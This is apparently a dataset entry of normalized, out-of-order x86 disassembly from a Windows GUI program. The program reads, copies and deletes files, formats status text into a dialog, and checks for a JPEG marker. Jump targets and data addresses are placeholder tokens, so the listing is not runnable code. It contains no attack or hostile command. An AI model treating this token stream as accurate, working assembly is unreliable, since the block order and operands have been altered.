cmp eax 0x7
mov [ ebp - 0x48 ] eax
mov [ rw-data ] esi
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
call sub_458010
mov ecx [ ebp - 0x40 ]
mov esi eax
mov eax [ ebp - 0x2c ]
add esp 0x4
cmp eax edi
jae r-xdata
lea eax [ ebp - 0x40 ]
mov eax [ ebp - 0x14 ]
imul eax eax 0x70
mov ecx [ eax + esi + 0x38 ]
add eax esi
cmp ecx 0xffffffff
jne r-xdata
cmp [ ebp - 0xd4 ] 0x10
jb r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0xe8 ]
add esi 0x14
mov esi [ esi + 0x14 ]
jmp r-xdata
mov ecx [ eax + 0x248 ]
mov edi 0x10
cmp ecx edi
jb r-xdata
mov [ ebp - 0x1c ] 0xfffffffa
jmp r-xdata
mov eax [ edi + 0x12c ]
test eax eax
mov ebx 0x10
jne r-xdata
cmp [ ebp - 0x2c ] edi
mov ecx [ ebp - 0x40 ]
jae r-xdata
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp - 0x48 ] ecx
mov cl [ rw-data ]
test cl cl
jne r-xdata
add ecx esi
mov eax ecx
mov [ ebp - 0xb8 ] 0xf
mov [ ebp - 0xbc ] 0x0
mov [ ebp - 0xcc ] 0x0
lea ebx [ eax + 0x1 ]
lea ebx [ ebx ]
lea ecx [ ebp - 0x40 ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x8c ]
mov [ ebp - 0xd4 ] 0xf
mov [ ebp - 0xd8 ] 0x0
mov [ ebp - 0xe8 ] 0x0
mov ecx [ eax ]
push eax
push ecx
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_448f60
mov edx [ ebp - 0x8c ]
push edx
call j_sub_4b66ed#2
mov ecx [ ebp - 0xc ]
add esp 0x4
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xe8 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ ecx ]
push 0x1
call [ edx ]
push esi
call sub_405e40
add eax 0x234
mov eax [ eax + 0x234 ]
jmp r-xdata
cmp [ edi + 0x130 ] ebx
jb r-xdata
mov [ ebp + 0x8 ] 0xffffffff
jmp r-xdata
mov eax ecx
mov [ ebp - 0x9c ] 0xf
mov [ ebp - 0xa0 ] ebx
mov [ ebp - 0xb0 ] 0x0
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
lea ecx [ ebp - 0x40 ]
mov edx [ eax * 4 + rw-data ]
mov eax edx
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ebx
push eax
push ecx
lea ecx [ ebp - 0xd0 ]
call sub_401e80
mov eax [ ebp - 0x30 ]
cmp esi eax
mov [ ebp - 0x4 ] 0x7
lea ecx [ ebp - 0x44 ]
ja r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ ebp - 0x44 ]
call sub_401cc0
lea ecx [ esi + 0x14 ]
push eax
push ecx
call sub_405ef0
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0x14 ]
push eax
push ecx
call sub_405ef0
add esp 0x8
jmp r-xdata
mov esi [ ebp - 0x24 ]
cmp [ esi + 0x28 ] edi
jb r-xdata
add edi 0x11c
mov edi [ edi + 0x11c ]
jmp r-xdata
mov eax [ edi + 0x2ec ]
test eax eax
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0xb4 ]
call sub_401e80
lea edx [ ebp - 0xb4 ]
push edx
lea eax [ ebp - 0x124 ]
push eax
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x8
call sub_448ca0
mov ecx [ eax ]
mov ebx [ eax + 0x4 ]
cmp [ ebp - 0x9c ] edi
mov [ ebp - 0xf8 ] ecx
mov [ ebp - 0x4 ] 0x6
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ ebp - 0x44 ]
call sub_401cc0
push 0x0
sub esi eax
push esi
call sub_4017f0
push 0xffffffff
push esi
call sub_401ba0
jmp r-xdata
cmp [ esi + 0x28 ] edi
jb r-xdata
cmp [ edi + 0x2f0 ] ebx
jb r-xdata
or esi 0xffffffff
jmp r-xdata
push edi
call j_sub_4b692d
mov edi [ rw-data ]
add esp 0x4
mov [ ebp + 0x8 ] eax
mov ecx [ ebp - 0x18 ]
inc ecx
test bl bl
mov [ ebp - 0x9c ] 0xf
mov [ ebp - 0xa0 ] 0x0
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0x18 ] ecx
je r-xdata
mov edx [ ebp - 0xb0 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x324 ]
push eax
lea ecx [ ebp - 0x44 ]
call sub_401cc0
push 0xffffffff
push 0x0
lea ecx [ ebp - 0xd0 ]
push ecx
lea ecx [ ebp - 0x44 ]
call sub_4018c0
cmp [ ebp - 0xb8 ] edi
mov [ ebp - 0x4 ] 0x6
jb r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x324 ]
push r--data
push edx
call [ wsprintfA@IAT ]
lea eax [ ebp - 0x324 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
add edi 0x2dc
mov edi [ edi + 0x2dc ]
jmp r-xdata
cmp [ edi + 0x360 ] ebx
jb r-xdata
cmp [ ebp - 0x18 ] 0x1
jle r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov [ ebp - 0xb8 ] 0xf
mov [ ebp - 0xbc ] 0x0
mov [ ebp - 0xcc ] 0x0
mov edx [ ebp - 0xcc ]
push edx
call j_sub_4b66ed#2
add esp 0x4
add edi 0x34c
mov edi [ edi + 0x34c ]
jmp r-xdata
push edi
call j_sub_4b692d
mov edi [ rw-data ]
add esp 0x4
mov esi eax
push 0xffffffff
push 0x0
lea ecx [ ebp - 0xec ]
push ecx
lea ecx [ ebp - 0x7c ]
call sub_401dd0
mov al [ rw-data ]
test al al
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
lea ecx [ ebp - 0xd0 ]
call sub_401e80
mov eax [ rw-data ]
cmp [ eax + 0x37c ] 0x10
mov [ ebp - 0x4 ] 0x12
jb r-xdata
mov ebx 0xf
mov eax edi
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xbc ] 0x0
mov [ ebp - 0xcc ] 0x0
lea edx [ eax + 0x1 ]
cmp [ ebp - 0x2c ] 0x10
mov eax [ ebp - 0x40 ]
jae r-xdata
mov esi [ rw-data ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp - 0x28 ] edx
je r-xdata
mov eax rw-data
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
lea ecx [ eax + 0x368 ]
mov ecx [ eax + 0x368 ]
jmp r-xdata
push eax
lea eax [ ebp - 0x324 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov edi [ ebp - 0x24 ]
mov edx [ edi + 0x4 ]
add esp 0xc
lea ecx [ ebp - 0x324 ]
push ecx
push 0xdd3
push edx
call [ SetDlgItemTextA@IAT ]
mov ebx [ rw-data ]
mov edx [ rw-data ]
mov esi [ rw-data ]
xor eax eax
lea esp [ esp ]
lea eax [ ebp - 0x40 ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
lea ecx [ ebp - 0x7c ]
call sub_401e80
push 0x5c
push 0x1
lea ecx [ ebp - 0x7c ]
call sub_4017f0
push 0xffffffff
push 0x0
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x7c ]
call sub_4018c0
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push ecx
lea ecx [ ebp - 0xb4 ]
call sub_401e80
mov ecx [ rw-data ]
mov eax r--data
mov [ ebp - 0x4 ] 0x13
add ecx 0x348
lea edi [ eax + 0x1 ]
mov eax ecx
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xa0 ] 0x0
mov [ ebp - 0xb0 ] 0x0
lea edi [ eax + 0x1 ]
mov ecx ebx
sub ecx edx
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov esi [ rw-data ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp - 0x28 ] edx
je r-xdata
mov esi [ ebp - 0x14 ]
imul esi esi 0x70
mov edx [ ecx + esi + 0x38 ]
cmp edx 0xffffffff
lea eax [ ecx + esi ]
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push r--data
call sub_401e80
mov ecx [ rw-data ]
push 0xffffffff
push 0x0
add ecx 0x364
push rw-data
call sub_401dd0
mov eax [ rw-data ]
xor edi edi
test eax eax
jle r-xdata
xor esi esi
cmp edx esi
jne r-xdata
mov ecx [ ebp - 0x14 ]
cmp [ esi + eax * 4 ] ecx
je r-xdata
cmp eax ecx
jge r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ebx 0x1
push ebx
lea ecx [ ebp - 0x5c ]
push ecx
lea edx [ ebp - 0x4c ]
push edx
push eax
mov [ ebp + 0x8 ] 0x0
call sub_4af910
mov edi eax
mov eax [ rw-data ]
lea ecx [ ebp - 0x5c ]
push ecx
lea edx [ ebp - 0x4c ]
add eax esi
push edx
push eax
call sub_4adff0
add esp 0x1c
test edi edi
jne r-xdata
mov ecx [ rw-data ]
push ecx
push ecx
mov ecx [ ebp - 0x20 ]
test ecx ecx
mov [ ebp - 0xf4 ] esp
mov eax esp
je r-xdata
lea ecx [ ecx ]
sub ebx edx
sar ebx 0x2
mov ecx ebx
xor ecx ecx
jmp r-xdata
inc eax
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
cmp edi ebx
mov ecx [ rw-data ]
jne r-xdata
push 0xa
call [ Sleep@IAT ]
mov eax [ ebp - 0x24 ]
mov cl [ eax + 0x8 ]
test cl cl
mov ecx [ rw-data ]
jne r-xdata
mov [ eax ] ecx
call sub_406260
add esp 0x8
test eax eax
jne r-xdata
inc [ ecx + 0x4 ]
mov ecx [ rw-data ]
mov edx [ ebx + ecx + 0x48 ]
inc edx
cmp esi edx
jne r-xdata
mov ecx [ rw-data ]
lea eax [ edi + 0x1 ]
push eax
add ecx 0x118
call sub_421150
mov ebx [ edx + eax * 4 ]
cmp ebx esi
mov [ ebp - 0x18 ] ebx
je r-xdata
mov edx [ edi + 0x4 ]
mov eax [ ebp - 0x14 ]
push esi
push esi
push edx
push eax
call sub_4706c0
add esp 0x10
cmp eax esi
jge r-xdata
cmp eax ecx
jl r-xdata
test edx edx
jne r-xdata
mov esi [ ebp - 0x14 ]
imul esi esi 0x70
cmp [ ecx + esi + 0x38 ] 0xffffffff
je r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov [ ebp - 0x1c ] ebx
push ebx
lea eax [ ecx + esi ]
lea edx [ ebp - 0x5c ]
push edx
lea ecx [ ebp - 0x4c ]
push ecx
push eax
call sub_4af910
mov edx [ rw-data ]
mov edi eax
lea eax [ edx + esi ]
lea ecx [ ebp - 0x5c ]
push ecx
lea edx [ ebp - 0x4c ]
push edx
push eax
call sub_4adff0
add esp 0x1c
test edi edi
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ rw-data ]
push edx
add ecx 0x118
call sub_421150
mov ecx [ rw-data ]
push esi
add ecx 0x2d8
call sub_421150
mov ecx [ rw-data ]
push 0xffffffff
push 0x0
lea eax [ ebp - 0xd0 ]
add ecx 0x348
push eax
call sub_401dd0
mov ecx [ rw-data ]
push 0xffffffff
push 0x0
lea edx [ ebp - 0xb4 ]
add ecx 0x364
push edx
call sub_401dd0
mov eax [ ebp - 0x9c ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov [ ebp - 0x1c ] 0xfffffffb
mov eax [ rw-data ]
inc edi
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ edi + 0x1 ]
push eax
add ecx 0x2d8
call sub_421150
mov [ ebp - 0x104 ] ebx
mov [ ebp - 0x4 ] 0x9
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx ebx
call sub_4440b0
mov al [ rw-data ]
test al al
je r-xdata
inc [ ebx + 0xd48 ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] esi
mov al [ rw-data ]
test al al
jne r-xdata
cmp [ ebp - 0xb8 ] esi
mov [ ebp - 0x9c ] 0xf
mov [ ebp - 0xa0 ] 0x0
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0x4 ] 0x2
jb r-xdata
mov eax [ ebp - 0xb0 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov ebx edi
imul ebx ebx 0x70
mov edx [ ebx + ecx + 0x48 ]
inc edx
cmp eax edx
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ ecx + esi + 0x40 ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp - 0xcc ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx ebx
push edx
call sub_4440b0
mov [ ebp - 0x54 ] eax
call sub_40af00
push eax
xor eax eax
mov al [ rw-data ]
mov ecx ebx
push eax
call sub_444100
cmp ebx esi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0xf4 ] ebx
je r-xdata
cmp [ ebp - 0x48 ] 0x4
je r-xdata
cmp [ ebp - 0x64 ] 0x10
mov eax [ ebp - 0x78 ]
jae r-xdata
mov esi [ ebp - 0x14 ]
mov eax [ rw-data ]
imul esi esi 0x70
cmp [ eax + esi + 0x18 ] 0x10
jb r-xdata
cmp eax 0x1
jne r-xdata
mov al [ rw-data ]
test al al
mov [ ebp - 0x4 ] 0xa
je r-xdata
cmp [ ebx + 0x8 ] esi
jne r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp eax esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x28 ] esi
je r-xdata
push 0x0
push 0x0
lea edx [ ebp - 0xf0 ]
push edx
push edi
push sub_447d90
xor ecx ecx
mov cl [ rw-data ]
push 0x0
xor edx edx
mov dl [ rw-data ]
push 0x0
push ecx
mov ecx ebx
push edx
push 0x0
push 0x1
push eax
call sub_43d820
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x78 ]
lea eax [ eax + esi + 0x4 ]
mov eax [ eax + esi + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov edi 0x10
cmp eax edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebx + 0xc ] 0x2000000c
mov esi [ ebx + 0x20 ]
mov [ ebp + 0x8 ] esi
jne r-xdata
mov eax [ ebx + 0x884 ]
cmp eax esi
mov ecx [ ebx + 0x458 ]
mov [ ebp + 0x8 ] ecx
jne r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
cmp eax esi
je r-xdata
cmp [ ebp - 0x64 ] 0x10
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x9
jae r-xdata
mov edi [ rw-data ]
test edi edi
je r-xdata
mov eax [ ebp - 0x2c ]
mov esi 0x10
cmp eax esi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ edx + esi ]
push ecx
push eax
mov [ ebp - 0x14 ] 0x0
call sub_4053a0
add esp 0x14
test eax eax
jge r-xdata
push eax
call sub_439280
add esp 0x4
cmp eax 0x1
jne r-xdata
push eax
lea ecx [ ebp - 0x324 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov ebx [ ebp - 0x24 ]
mov eax [ ebx + 0x4 ]
add esp 0xc
lea edx [ ebp - 0x324 ]
push edx
push 0xdd3
push eax
call [ SetDlgItemTextA@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
lea eax [ ebp - 0x40 ]
xor esi esi
movzx eax [ ebx + 0x32 ]
imul eax [ ebx + 0x28 ]
mov ecx [ ebx + 0x2c ]
cdq
and edx 0x7
add eax edx
mov edi eax
shl ecx 0x1
mov eax 0x55555556
imul ecx
sar edi 0x3
mov eax edx
add edi 0x3
shr eax 0x1f
and edi 0xfffffffc
add edx eax
imul edi edx
sub esi edi
jmp r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ edx ]
mov esi [ eax + 0x18 ]
add esi ecx
xor esi esi
jmp r-xdata
push eax
call [ LocalLock@IAT ]
mov [ ebx + 0x20 ] eax
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
push ecx
push ebx
push 0x0
push edx
push sub_447d90
xor ecx ecx
mov cl [ rw-data ]
push 0x0
xor edx edx
mov dl [ rw-data ]
push 0x0
push ecx
mov ecx [ ebp - 0x48 ]
push edx
push 0x0
push ecx
mov ecx [ ebp - 0x18 ]
push eax
call sub_43d820
test ebx ebx
mov [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0x78 ]
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp + 0x8 ] edx
je r-xdata
push eax
lea eax [ ebp - 0x324 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov ebx [ ebp - 0x24 ]
mov edx [ ebx + 0x4 ]
add esp 0xc
lea ecx [ ebp - 0x324 ]
push ecx
push 0xdd3
push edx
call [ SetDlgItemTextA@IAT ]
cmp [ ebp - 0x64 ] esi
mov eax [ ebp - 0x78 ]
jae r-xdata
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x2c ] 0x10
mov eax [ ebp - 0x40 ]
jae r-xdata
mov [ ebp + 0x8 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + esi ]
mov ecx [ eax + 0x40 ]
test ecx ecx
mov cl [ rw-data ]
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0x8 ] 0x0
mov al [ rw-data ]
test al al
je r-xdata
mov ebx [ ebp - 0x18 ]
mov ecx ebx
call sub_40b2d0
mov ecx [ ebp - 0x18 ]
mov edi eax
mov eax [ ecx + 0xc ]
add ebx 0x24
mov [ ebp - 0x28 ] eax
mov ecx [ eax + 0x4 ]
mov ecx [ ecx ]
mov eax [ eax + 0x1c ]
lea edi [ eax + ecx ]
xor edi edi
jmp r-xdata
test eax eax
jne r-xdata
push ebx
call sub_4b66ed
add esp 0x4
jmp r-xdata
mov esi [ ebp - 0x14 ]
imul esi esi 0x70
cmp [ edi + esi + 0x18 ] 0x10
jb r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x324 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov ecx [ edi + 0x4 ]
add esp 0xc
lea eax [ ebp - 0x324 ]
push eax
push 0xdd3
push ecx
call [ SetDlgItemTextA@IAT ]
cmp [ ebx + 0xc ] 0x20000008
mov [ ebp - 0x98 ] 0x0
jne r-xdata
lea eax [ ebp - 0x40 ]
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
test cl cl
je r-xdata
test cl cl
mov [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ebp - 0x80 ]
mov [ ebp - 0x1c ] 0x2
mov ecx [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov [ ebp - 0x28 ] 0x0
cmp [ ebp - 0x64 ] 0x10
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0xd
jae r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x7b4 ]
call sub_439410
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x54 ]
xor edx edx
mov dl [ rw-data ]
mov [ ebp - 0x4 ] 0xb
push edx
mov edx [ ebp + 0x8 ]
push 0x1
push eax
mov eax [ ebp - 0x28 ]
push ecx
push 0x0
push 0x0
push edi
push esi
push edx
push ebx
push eax
lea ecx [ ebp - 0x7b4 ]
call sub_43ba10
test eax eax
jne r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x44c ]
lea ebx [ eax + 0x45c ]
mov [ ebp - 0x28 ] edx
jmp r-xdata
lea edi [ edi + esi + 0x4 ]
mov edi [ edi + esi + 0x4 ]
jmp r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
push eax
push 0x0
call [ LocalAlloc@IAT ]
mov edi eax
push 0x0
lea eax [ ebp - 0x108 ]
push eax
push edi
call [ LocalSize@IAT ]
push eax
push edi
push esi
call [ ReadFile@IAT ]
push esi
call [ CloseHandle@IAT ]
cmp [ ebp - 0xf0 ] 0x20000008
mov [ ebp - 0x94 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] 0x0
jmp r-xdata
cmp [ edi + 0x28 ] 0x10
mov eax [ rw-data ]
jb r-xdata
mov [ ebp - 0x98 ] 0x1
push eax
call [ LocalFree@IAT ]
jmp r-xdata
cmp [ ebp - 0x64 ] edi
mov ecx [ ebp - 0x78 ]
jae r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ebx
push sub_447d90
push ecx
cmp [ rw-data ] edi
mov ecx [ rw-data ]
push edx
jae r-xdata
cmp [ ebp - 0x64 ] edi
mov ecx [ ebp - 0x78 ]
jae r-xdata
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x14 ]
push edx
push eax
mov [ ebp - 0x14 ] 0x0
call sub_4053a0
add esp 0x14
test eax eax
jl r-xdata
mov edx [ ebp - 0x4c ]
test edx edx
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push 0x6
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call sub_41c070
add esp 0x18
test eax eax
je r-xdata
lea eax [ ebp - 0x78 ]
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
xor ecx ecx
mov [ ebp + 0x8 ] ecx
mov eax [ rw-data ]
test eax eax
mov [ ebp - 0x4 ] 0x10
je r-xdata
push edi
call sub_439280
add esp 0x4
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ rw-data ]
imul eax eax 0x70
add eax ecx
cmp [ ebx + 0x28 ] 0x10
jb r-xdata
mov [ ebp - 0x94 ] 0x1
lea ebx [ edi + 0x14 ]
mov ebx [ edi + 0x14 ]
jmp r-xdata
cmp [ eax + 0x18 ] edi
jb r-xdata
lea ecx [ ebp - 0x78 ]
mov edx [ eax + 0x28 ]
push ecx
mov ecx [ eax + 0x2c ]
push ecx
cmp [ ebp - 0x2c ] edi
mov ecx [ ebp - 0x40 ]
push edx
jae r-xdata
mov ecx rw-data
push 0x0
push 0x0
push ecx
push 0x0
push eax
call sub_4053a0
add esp 0x14
test eax eax
jl r-xdata
lea ecx [ ebp - 0x78 ]
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push ebx
push sub_447d90
push eax
cmp [ rw-data ] edi
mov eax [ rw-data ]
push ecx
jae r-xdata
mov al [ rw-data ]
test al al
je r-xdata
cmp [ ebp - 0x64 ] edi
mov eax [ ebp - 0x78 ]
jae r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
push ebx
push sub_447d90
push edx
push eax
cmp [ rw-data ] edi
mov eax [ rw-data ]
jae r-xdata
mov esi eax
mov [ ebp - 0x28 ] esi
mov [ ebp + 0x8 ] 0x1
jmp r-xdata
inc [ eax + 0x4 ]
mov eax [ rw-data ]
mov eax [ ecx + edx * 4 + 0x4 ]
sub eax [ ecx + edx * 4 ]
jmp r-xdata
mov edx [ ebp - 0x14 ]
lea esi [ edx + 0x1 ]
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
lea ecx [ ebp + 0x8 ]
add esi eax
push ecx
push esi
call sub_402850
add esp 0x10
mov eax [ ebp - 0x5c ]
test eax eax
je r-xdata
lea esi [ ebx + 0x14 ]
mov esi [ ebx + 0x14 ]
jmp r-xdata
mov edx [ ebp - 0x98 ]
mov ecx [ eax + esi + 0x50 ]
push edx
mov edx [ eax + esi + 0x4c ]
mov eax [ ebp - 0x14 ]
push ecx
push edx
push eax
call [ LocalSize@IAT ]
mov ecx [ ebp - 0x14 ]
push eax
push ecx
push ebx
call sub_405e70
add esp 0x18
mov [ ebp + 0x8 ] eax
push 0x0
add eax 0x4
push ecx
push eax
call [ CopyFileA@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ eax + 0x4 ]
push 0x0
push ecx
push eax
call [ CopyFileA@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
push ecx
cmp [ eax + 0x18 ] edi
push 0x0
push 0x0
jb r-xdata
lea ecx [ ebp - 0x40 ]
mov eax [ ebp - 0x84 ]
inc eax
mov [ ebp + 0x8 ] 0x1
mov [ ebp - 0x84 ] eax
jmp r-xdata
push eax
call [ LocalFree@IAT ]
jmp r-xdata
push eax
mov eax [ rw-data ]
mov edx [ eax + esi + 0x2c ]
mov eax [ eax + esi + 0x28 ]
push edx
push eax
cmp [ ebp - 0x2c ] edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov eax rw-data
cmp [ ebp - 0x64 ] edi
mov eax [ ebp - 0x78 ]
jae r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
push ebx
push sub_447d90
push ecx
push eax
cmp [ rw-data ] edi
mov eax [ rw-data ]
jae r-xdata
push 0x0
push eax
push ecx
call [ CopyFileA@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
lea eax [ ebp - 0x78 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + esi + 0x2c ]
mov eax [ eax + esi + 0x28 ]
push edx
push eax
cmp [ ebp - 0x2c ] edi
mov eax [ ebp - 0x40 ]
jae r-xdata
mov eax rw-data
mov eax [ ebp + 0x8 ]
test eax eax
mov edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xc
je r-xdata
mov [ ecx ] eax
call sub_406750
add esp 0x24
mov [ ebp + 0x8 ] eax
jmp r-xdata
inc [ eax + 0x4 ]
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x374 ]
push ecx
mov ecx [ ebp - 0x54 ]
push sub_447d90
push eax
mov eax [ ebp - 0x48 ]
push edx
mov edx [ ebp - 0x388 ]
push eax
push ecx
push edx
lea eax [ ebp - 0x7b4 ]
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
test ecx ecx
mov [ ebp - 0x4 ] 0xf
je r-xdata
mov edx [ ecx ]
push 0x2
lea eax [ ebp - 0x58 ]
push eax
call [ edx + 0x18 ]
cmp [ ebp - 0x58 ] 0xd8ff
jne r-xdata
mov eax [ ebp - 0x4c ]
test eax eax
je r-xdata
push 0x1
push ecx
push ecx
push ecx
push ecx
push eax
push edi
call [ LocalFree@IAT ]
jmp r-xdata
mov edx [ ebp - 0x94 ]
mov ecx [ eax + 0x50 ]
push edx
mov edx [ eax + 0x4c ]
push ecx
push edx
push edi
call [ LocalSize@IAT ]
push eax
push edi
push esi
call sub_405e70
add esp 0x18
test edi edi
mov [ ebp + 0x8 ] eax
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x14 ]
push eax
push ecx
call [ LocalSize@IAT ]
mov edx [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push edx
push 0x0
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
lea eax [ ebp - 0x40 ]
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
mov eax [ rw-data ]
mov ecx [ eax + esi + 0x2c ]
push ecx
mov ecx [ eax + esi + 0x28 ]
push ecx
cmp [ ebp - 0x2c ] edi
mov ecx [ ebp - 0x40 ]
jae r-xdata
mov eax rw-data
push eax
mov eax [ ebp - 0x20 ]
test eax eax
push 0x0
push 0x0
push ecx
push ecx
mov [ ebp + 0x8 ] esp
mov ecx esp
je r-xdata
lea eax [ ebp - 0x40 ]
mov edi [ ebp - 0x18 ]
mov esi [ ecx + 0x4 ]
lea eax [ ecx + 0x4 ]
dec esi
mov edx esi
test edx edx
mov [ eax ] esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push 0x2
lea eax [ ebp - 0x58 ]
push eax
call [ edx + 0x18 ]
